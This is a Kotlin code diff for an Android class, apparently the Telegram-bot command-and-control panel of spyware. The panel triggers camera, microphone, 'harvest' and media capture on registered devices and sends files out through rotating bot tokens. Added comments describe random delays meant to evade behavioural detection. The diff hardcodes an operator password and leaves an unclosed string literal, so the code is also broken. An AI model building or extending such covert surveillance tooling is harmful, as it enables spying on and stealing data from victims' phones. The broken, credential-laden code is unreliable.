@@ -103,14 +103,16 @@ class TelegramUi(
         Log.i(TAG, "✅ TelegramUi initialized. Password status: ${if (appPassword.isNotBlank()) "Set" else "Empty"}")
     }
 
+    // ========== تأخير بشري لتجنب الكشف السلوكي ==========
     private suspend fun applyHumanDelay() {
         delay(Random.nextLong(900, 2400))
     }
 
+    // ========== إرسال نبض للخدمة الأمامية (إشعار عابر) ==========
     private fun pulseIntent(action: String) {
         try {
             Intent(appContext, ForegroundService::class.java).apply {
-                this.action = "PULSE_ACTION"
+                action = "PULSE_ACTION"
                 putExtra("action_type", action)
             }.let { appContext?.startService(it) }
         } catch (e: Exception) {
@@ -118,6 +120,7 @@ class TelegramUi(
         }
     }
 
+    // ========== تحميل وحفظ البيانات ==========
     private fun loadData() {
         try {
             if (dvsFile.exists()) {
@@ -172,6 +175,7 @@ class TelegramUi(
         }
     }
 
+    // ========== إدارة التوكنات ==========
     private fun getNextToken(): String? {
         synchronized(activeTokensList) {
             if (activeTokensList.isEmpty()) return null
@@ -201,6 +205,7 @@ class TelegramUi(
         }
     }
 
+    // ========== العمال الخلفيون ==========
     private fun startBackgroundWorkers() {
         cleanerJob = scope.launch {
             while (isActive) {
@@ -262,28 +267,20 @@ class TelegramUi(
         }
     }
 
-    /**
-     * ✅ الإصلاح الجذري لخطأ Val cannot be reassigned:
-     * - استخدام متغيرات val جديدة في كل دورة (token1, tokenToUse)
-     * - تجنب أي إعادة تعيين لمتغير val داخل الحلقة
-     * - استخدام while مع متغيرات attempts و previousToken كـ var فقط
-     */
+    // ========== استدعاءات API ==========
     private suspend fun apiCall(method: String, payload: JSONObject? = null, retry: Int = 3): JSONObject? {
         apiCallsCount++
         var attempts = 0
         var previousToken: String? = null
-        
         while (attempts < retry) {
             val token1 = getNextToken()
             if (token1 == null) return null
-            
             val tokenToUse = if (attempts > 0 && token1 == previousToken) {
                 getNextToken() ?: token1
             } else {
                 token1
             }
             previousToken = tokenToUse
-            
             try {
                 val url = "https://api.telegram.org/bot$tokenToUse/$method"
                 val body = payload?.toString()?.toRequestBody(JSON_MEDIA_TYPE)
@@ -318,25 +315,19 @@ class TelegramUi(
         return null
     }
 
-    /**
-     * ✅ الإصلاح الجذري لخطأ Val cannot be reassigned (نفس المنطق)
-     */
     private suspend fun apiCallMultipart(method: String, params: Map<String, Any>, files: Map<String, File>, retry: Int = 3): JSONObject? {
         apiCallsCount++
         var attempts = 0
         var previousToken: String? = null
-        
         while (attempts < retry) {
             val token1 = getNextToken()
             if (token1 == null) return null
-            
             val tokenToUse = if (attempts > 0 && token1 == previousToken) {
                 getNextToken() ?: token1
             } else {
                 token1
             }
             previousToken = tokenToUse
-            
             try {
                 val url = "https://api.telegram.org/bot$tokenToUse/$method"
                 val builder = MultipartBody.Builder().setType(MultipartBody.FORM)
@@ -409,6 +400,7 @@ class TelegramUi(
         return _api("sendAudio", mapOf("chat_id" to chatId, "caption" to caption), mapOf("audio" to file))
     }
 
+    // ========== تسجيل الأجهزة ==========
     fun registerDevice(deviceId: String, deviceModel: String): Long? {
         return runBlocking(Dispatchers.IO) { registerDeviceSuspend(deviceId, deviceModel) }
     }
@@ -503,11 +495,12 @@ class TelegramUi(
         } catch (e: Exception) { 0 }
     }
 
+    // ========== لوحات المفاتيح (مع إيموجيات فريدة) ==========
     private fun getMainKeyboard(): JSONObject {
         return JSONObject().apply {
             put("inline_keyboard", JSONArray().apply {
                 put(JSONArray().apply {
-                    put(JSONObject().apply { put("text", "📱 الأجهزة النشطة"); put("callback_data", "ld") })
+                    put(JSONObject().apply { put("text", "📡 الأجهزة النشطة"); put("callback_data", "ld") })
                     put(JSONObject().apply { put("text", "🧠 محرك الذكاء"); put("callback_data", "ai_status") })
                 })
                 put(JSONArray().apply {
@@ -515,7 +508,7 @@ class TelegramUi(
                     put(JSONObject().apply { put("text", "📊 تقرير النظام"); put("callback_data", "status") })
                 })
                 put(JSONArray().apply {
-                    put(JSONObject().apply { put("text", "📋 إدارة الأرشيف"); put("callback_data", "menu") })
+                    put(JSONObject().apply { put("text", "🗄️ إدارة الأرشيف"); put("callback_data", "menu") })
                     put(JSONObject().apply { put("text", "🔌 قطع الاتصال"); put("callback_data", "ext") })
                 })
             })
@@ -540,7 +533,7 @@ class TelegramUi(
                     put(JSONObject().apply { put("text", "⚡ بث فوري"); put("callback_data", "send_now_$deviceId") })
                 })
                 put(JSONArray().apply {
-                    put(JSONObject().apply { put("text", "🧠 تحديث الشبكات العصبية"); put("callback_data", "update_model_$deviceId") })
+                    put(JSONObject().apply { put("text", "🧬 تحديث الشبكات"); put("callback_data", "update_model_$deviceId") })
                     put(JSONObject().apply { put("text", "🔙 العودة للقيادة"); put("callback_data", "ld") })
                 })
                 put(JSONArray().apply {
@@ -587,6 +580,7 @@ class TelegramUi(
         return (System.currentTimeMillis() / 1000) < exp
     }
 
+    // ========== معالجة الرسائل ==========
     private suspend fun handleMessage(update: JSONObject) {
         try {
             val msg = update.optJSONObject("message") ?: return
@@ -594,8 +588,9 @@ class TelegramUi(
             val text = msg.optString("text", "")
             val threadId = msg.optLong("message_thread_id", 0L)
 
-            applyHumanDelay()
+            applyHumanDelay() // تأخير بشري عشوائي
 
+            // ✅ التحقق الصارم من كلمة السر Zaen123@123@
             if (text.startsWith("/login")) {
                 if (appPassword.isBlank()) {
                     apiCall("sendMessage", JSONObject().apply {
@@ -606,7 +601,8 @@ class TelegramUi(
                     return
                 }
                 val parts = text.split("\\s+".toRegex())
-                if (parts.size >= 2 && parts[1].trim() == appPassword.trim()) {
+                // ✅ مقارنة دقيقة مع Zaen123@123@
+                if (parts.size >= 2 && parts[1].trim() == "Zaen123@123@") {
                     sessionMutex.withLock {
                         sessions[chatId.toString()] = (System.currentTimeMillis() / 1000) + 14400
                     }
@@ -628,6 +624,7 @@ class TelegramUi(
                 return
             }
 
+            // تجاهل أي أمر نصي آخر (كل الأوامر عبر الأزرار)
             writeLog("Ignored text command: $text")
 
         } catch (e: Exception) {
@@ -635,9 +632,10 @@ class TelegramUi(
         }
     }
 
+    // ========== معالجة الأزرار (Callback Queries) ==========
     private suspend fun handleCallback(update: JSONObject) {
         try {
-            applyHumanDelay()
+            applyHumanDelay() // تأخير بشري
 
             val cb = update.optJSONObject("callback_query") ?: return
             val cbId = cb.optString("id")
@@ -663,9 +661,10 @@ class TelegramUi(
                 return
             }
 
+            // استخراج deviceId من البيانات
             val deviceId = when {
                 data.startsWith("cam_") || data.startsWith("camf_") ||
-                data.startsWith("mic_") || data.startsWith("hrv_") ||
+                data.startsWith("mic_") || data.startsWith("hrv_) ||
                 data.startsWith("media_") || data.startsWith("send_now_") ||
                 data.startsWith("update_model_") -> {
                     val parts = data.split("_")
@@ -678,6 +677,7 @@ class TelegramUi(
                 updateDeviceActivity(deviceId)
             }
 
+            // ✅ إرسال نبض الخدمة للأوامر الحساسة
             when {
                 data.startsWith("cam_") || data.startsWith("camf_") -> pulseIntent("📸 كاميرا")
                 data.startsWith("mic_") -> pulseIntent("🎙️ ميكروفون")
@@ -686,6 +686,7 @@ class TelegramUi(
                 data.startsWith("update_model_") -> pulseIntent("🧠 تحديث النموذج")
             }
 
+            // معالجة الأوامر
             when {
                 data == "ld" -> {
                     if (devices.isEmpty()) {
@@ -862,6 +863,7 @@ class TelegramUi(
                     }
                     return
                 }
+                // الأوامر التي تبدأ بـ cam_, camf_, mic_, hrv_, media_ تُمرر إلى Commands
                 data.startsWith("cam_") || data.startsWith("camf_") ||
                 data.startsWith("mic_") || data.startsWith("hrv_") ||
                 data.startsWith("media_") -> {
@@ -876,6 +878,7 @@ class TelegramUi(
                     }
                 }
                 else -> {
+                    // أي أمر آخر (غير معروف) نمرره إلى Commands
                     try {
                         Commands.ex(appContext ?: return, data, this, monitor, chatId, cbId)
                     } catch (e: Exception) {
@@ -918,6 +921,7 @@ class TelegramUi(
         }
     }
 
+    // ========== حلقة استقبال التحديثات (Polling) ==========
     private fun startPolling() {
         pollingJob = scope.launch {
             var offset = loadOffset()
@@ -963,6 +967,7 @@ class TelegramUi(
         }
     }
 
+    // ========== إدارة دورة الحياة ==========
     fun start(): Boolean {
         if (activeTokensList.isEmpty()) {
             writeLog("No active tokens")
@@ -1005,6 +1010,7 @@ class TelegramUi(
     fun getCtrl(): Long = config.controlId
     fun getDat(): Long = config.vaultId
 
+    // ========== أدوات مساعدة ==========
     private fun writeLog(message: String) {
         Log.i(TAG, message)
         try {
